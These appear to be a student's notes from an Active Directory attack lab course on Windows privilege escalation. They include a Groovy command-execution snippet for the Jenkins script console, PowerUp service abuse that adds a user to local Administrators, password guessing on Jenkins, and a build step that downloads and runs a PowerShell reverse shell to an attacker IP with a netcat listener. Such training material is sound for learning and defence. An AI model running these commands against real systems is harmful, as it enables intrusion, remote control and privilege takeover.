#### Privilege Escalation - Feature Abuse
- What we have been doing up to now (and will keep doing further in the class) is relying on features abuse.
- Features abuse are awesome as there are seldom any patches for them and they are not the primary focus for security teams!
- Targeting enterprise applications which are not built with security in mind is a really good example of features abuse.
- On Windows, many enterprise applications need either Administrative privileges or SYSTEM privileges making them a great avenue for PrivEsc.

#### A realistic look on feature abuse with legacy services
- What tools like BloodHound miss out on are that lots of Enterprise Environments are full of insecurely written dashboards, appliances and applications that may not conform to the security standards required for a public facing application.
- If we can find a service that is either old or written insecurely, we may be able to execute commands on the machine that hosts it, using it as an attack vector.
- On Windows machines, these services usually run with SYSTEM or admin privileges, which make theses even more attractive.

#### Privilege Escalation - Feature Abuse - Jenkins
- An example of such is an environment using a legacy version of Jenkins.
	- Jenkins is a widely used Continuous Integration tool.
	- There are many interesting aspects with Jenkins but for now we would limit our discussion to the ability of running system commands on Jenkins.
	- There is a Jenkins server running on `dcorp-ci` (172.16.3.11) on the default Jenkins port 8080.
	- We are using an older version of Jenkins as an example that represents a vulnerable enterprise application.
	- Jenkins used to be a lot more vulnerable than it is now, for example 5-6 years ago, there would be no authentication by default on Jenkins, so if one just knows the URL for Jenkins, he was able to use it as an Administrator without any roadblocks. This is not the case anymore.
	- Apart from numerous plugins, there are two ways of executing commands on a Jenkins Master.
	- If we have Admin access (default installation before 2.x) on the Jenkins console, we can run commands on a Jenkins Master by going to the script console at `http://<jenkins_server URL>/script`.
	- In the script console, Groovy scripts like the one below, could be executed.
			```def scout = new StringBuffer(), serr = new StringBuffer()
			def proc = '[INSERT COMMAND]'.execute()
			proc.consumeProcessOutput(sout, serr)
			proc.waitForOrKill(1000)
			println "out> $sout err> $serr"```
	- If you don't have admin access but could add or edit build steps in the build configuration, you could just add a build step, add "Execute Windows Batch Command" and enter: `powershell -c <command>`
	- Again, you could download and execute scripts, run encoded scripts and more.
	- We are not going to run a port scan to enumerate Jenkins, recall that we have skipped that part to focus on more interesting attack tactics.

#### Privilege Escalation - Relaying
- In a relaying attack, the target credentials are not captured. Instead, they are forwarded to a local or remote service or an endpoint for authentication.
- Two types based on authentication:
	- NTLM relaying
	- Kerberos relaying
- LDAP and AD CS are the two most abused services for relaying.

#### Learning Objective 5
- Exploit a service on `dcorp-studentX` and elevate privileges to local administrator.
	- `C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`
	- `powershell`
	- `. C:\AD\Tools\PowerUp.ps1`
	- `Invoke-AllChecks`
	- We can find multiple possible attack vectors for PrivEsc.
	- The "AbyssWebServer" service is intentionally vulnerable and has an "Unquoted Service Path". There are also many other services with "Unquoted Service Paths" and "Modifiable Service Files".
	- The script also reports a "Modifiable Service Files" PrivEsc vector for Edge, but it is a false-positive here.
	- The one that we are going to abuse, because it is the easiest one to abuse is the service permissions issue, shown here as "Modifiable Services", this issue is present with two services, "AbyssWebServer" and "SNMPTRAP".
	- For "SNMPTRAP", the original path is `C:\Windows\System32\snmptrap.exe`, and the service runs with `LocalSystem` privileges.
	- We have the rights (as a part of `WD` (Everyone)) to modify the service, which includes restarting it. (verifiable by executing `sc.exe sdshow snmptrap`)
	- What we are going to do is to modify the "SNMPTRAP" service and restart it.
	- We will modify the path to the net command so that when the service restarts it adds our studentX user to the local Administrators group.
		- PowerUp suggests an abuse function `Invoke-ServiceAbuse` here, however we are not going to use it because if we run `Invoke-ServiceAbuse` without specifying anything but the service name, it adds a new local user with the username "john" and password "Password123!", and adds it to the local Administrators group.
		- If we specify a username or domain username using the `-UserName` option like `-UserName "TESTLAB\john"`, it adds the domain user to the local Administrators group. This is something we would like to do, so that if required we can start a process that has the domain context and a high integrity (privilege), which means we want the domain context, but run as administrator.
		- We are going to run the command for either of the service we want to abuse, whether it be "AbyssWebServer" or "SNMPTRAP".
			- `Invoke-ServiceAbuse -Name "AbyssWebServer" -UserName "dcorp\student1" -Verbose`
			- We will see that the original path of the service is shown, and then the replaced path is shown, which is a net command to add dcorp\studentx to the local group `Administrators`.
			- The binary path is replaced and the service is restarted, as soon as the payload is executed with administrative privileges, and the original path is restored.
			- On executing `net localgroup Administrators`, we can see that studentX has been added to the local Administrators group.
			- On restarting the machine, we would have local Administrator privileges.
			- We could also have ran WinPEAS or PrivEscCheck for the same result, as shown in the lab manual.
- Identify a machine in the domain where studentX has local administrative access.
	- `C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`
	- `powershell`
	- `. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1`
		- Whenever we run this script, we should be aware that it is a noisy script, if we look at the MDI alerts for it in the target environment, we would see that most of it is User and I.P. address reconnaissance (SMB), many of them because the session enumeration process by itself is noisy.
	- `Find-PSRemotingLocalAdminAccess -Verbose`
	- It fetches a list of servers from the DC, and tries to enumerate if we have administrative access on any of the machines.
	- We would have local admin access only on `dcorp-adminsrv`.
- Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 - the dcorp-ci server.
	- We are already informed in the learning objective that there is a Jenkins instance on 172.16.3.11:8080, when we navigate to it we can see that it is not authenticated and we cannot log in.
	- While being unauthenticated, we can enumerate the users and build executors. We can see that Jenkins is using its own user DB.
	- We can also enumerate that there is only one node, and that thus the build master is running Windows Server 2022.
	- Jenkins is a CI/CD tool that allows us to run builds.
	- Even today Jenkins doesn't have a password policy, which means we can even have as weak passwords as a single character.
	- Hydra has a "NSR - NullSameReverse" option for password brute-forcing, drawing inspiration from which, we can try to use the username as the password for the build user and see that we can log in.
	- Judging by the dashboard we can deduce that the build user does not have admin privileges, but we can see if it has the permission to configure a build by going to a project and seeing if we are able to see the configure option in the menu bar after clicking the project name.
	- What we can do here, among other things, is to configure a build step in a malicious manner.
	- A build step runs regardless of success or failure of the build.
	- We can try to run a Windows Batch File, because the command will execute on the build executor, which was a Windows Server 2022 machine.
	- We can add a build step to `Execute Windows batch command`, and add the command `powershell iex (iwr -UseBasicParsing http://172.16.100.1/Invoke-PowerShellTcp.ps1);power -Reverse -IPAddress 172.16.100.2 -Port 443`, followed by saving it.
	- The reverse shell payload can be hosted using HFS, a HTTP File Server.
	- Before building this, we need to set up a listener, we can set up a simple net cat listener for the rev-shell.
		- `C:\AD\Tools\netcat-win32-1.12\nc64.exe -nvlp 443`
	- Next we will run the build from the project's page to execute the reverse shell.
	- Do we have admin access on the target machine?
		  - Yes, we do not need to check for it since Jenkins always requires admin access on the machine it is hosted on.
		  - If we execute `$env:username`, we will see that we have access as the `ciadmin` user, which is a domain user, verifiable by its environment variables.
		  - `ls env:`
	- Will this be detected by an EDR?
		- Yes, since this is a very simple reverse shell, any EDR would detect it.